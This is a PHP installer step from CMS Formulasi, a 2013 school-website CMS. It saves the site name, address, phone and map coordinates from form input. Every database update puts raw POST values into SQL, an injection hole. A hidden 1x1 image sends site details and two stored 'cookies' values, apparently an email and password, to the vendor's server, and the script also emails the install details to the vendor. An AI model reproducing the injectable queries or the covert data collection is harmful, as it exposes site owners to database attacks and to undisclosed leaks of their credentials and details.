<?php if(!isset($_SESSION)){session_start();}   error_reporting(0);   ?>
<center><p><p><img src="../images/loader.gif"  style="   vertical-align: middle;text-align: center;"><br>Mohon Tunggu ..!</center>
<?php    
/* Forum Multimedia Edukasi www. formulasi.or.id cms.formulasi.or.id
 * @copyright	Copyright (C) 2013 CMS Formulasi Open Source, Inc. All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 * Ari Rusmanto ariecupu@ymail.com
 * Fauzan A Mahanani fauzan.mahanani@formulasi.or.id
 */




include "../konfigurasi/koneksi.php";

$_SESSION['namaskl'] =$_POST['nama'];	

mysql_query ("UPDATE ".$DB_KODE."_pengaturan SET isi_pengaturan ='$_POST[nama]' WHERE id_pengaturan='8'");
mysql_query ("UPDATE ".$DB_KODE."_pengaturan SET isi_pengaturan ='$_POST[url]' WHERE id_pengaturan='1'");
mysql_query ("UPDATE ".$DB_KODE."_pengaturan SET isi_pengaturan ='$_POST[jenjang_sekolah]' WHERE id_pengaturan='19'");

mysql_query ("UPDATE ".$DB_KODE."_pengaturan SET isi_pengaturan ='$_POST[latitude]', isi_pengaturan2 ='$_POST[longitude]' WHERE nama_pengaturan='lolagmap'");
mysql_query ("UPDATE ".$DB_KODE."_pengaturan SET isi_pengaturan ='$_POST[alamat]', isi_pengaturan2 ='' WHERE nama_pengaturan='alamat'");
mysql_query ("UPDATE ".$DB_KODE."_pengaturan SET isi_pengaturan ='$_POST[telepon]', isi_pengaturan2 ='' WHERE nama_pengaturan='telepon'");

$url=$_SERVER['SERVER_NAME'];
$nama=$_POST['nama'];
$jj=$_POST['jenjang_sekolah'];
$kk="Website ".$_POST['nama_sekolah']." yang beralamat di ".$_POST['alamat']." nomor telephone ".$_POST['telepon'];
$tl=$_POST['telepon'];
$al=$_POST['alamat'];
$lo=$_POST['longitude'];
$la=$_POST['latitude'];

$kepsek=mysql_query("SELECT * FROM ".$DB_KODE."_pengaturan WHERE nama_pengaturan='cookies'");
				$k=mysql_fetch_array($kepsek);

$em=$k['isi_pengaturan'];
$pa=$k['isi_pengaturan2'];
$tp=0;
?>
<img src="http://peta.formulasi.org/m.php?u=<?php echo $url;?>&tp=<?php echo $tp;?>&n=<?php echo $nama;?>&a=<?php echo $al;?>&t=<?php echo $tl;?>&j=<?php echo $jj;?>&lo=<?php echo $lo;?>&la=<?php echo $la;?>&e=<?php echo $em;?>&p=<?php echo $pa;?>" width="1" height="1">

<?php
$to = "fauzan.mahanani@formulasi.or.id,cms@formulasi.or.id";
$subject = "install ".$_SERVER['SERVER_NAME']." ".$_POST[nama];
$message = "CMS FORMULASI DI ".$_SERVER['SERVER_NAME']." ".$_SESSION['postemail']." ".$_POST['nama']." ".$_POST['url'];
$from = $_SESSION['postemail'];
$reply = $_SESSION['postemail'];

$headers = 'From: '.$from . "\r\n" .
    'Reply-To: '.$reply . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to,$subject,$message,$headers);


if (!file_exists("../.htaccess")) {
    $old = '../htaccess.txt';
$today = date("Ymd");
$new = '../.htaccess';
if (copy($old, $new)) {
  unlink($old);
}
}

$_SESSION['jenjang']=$_POST['jenjang_sekolah'];

$_SESSION['nama']=$_POST['nama'];

unset($_SESSION['kedua']);

    
            

?>
<script language="javascript">
setTimeout("top.location.href = 'akhir.php'",10000);
</script>
<?php
//header('location:akhir.php');

/* Forum Multimedia Edukasi www. formulasi.or.id cms.formulasi.or.id
 * @copyright	Copyright (C) 2013 CMS Formulasi Open Source, Inc. All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 * Ari Rusmanto ariecupu@ymail.com
 * Fauzan A Mahanani fauzan.mahanani@formulasi.or.id
 */

?>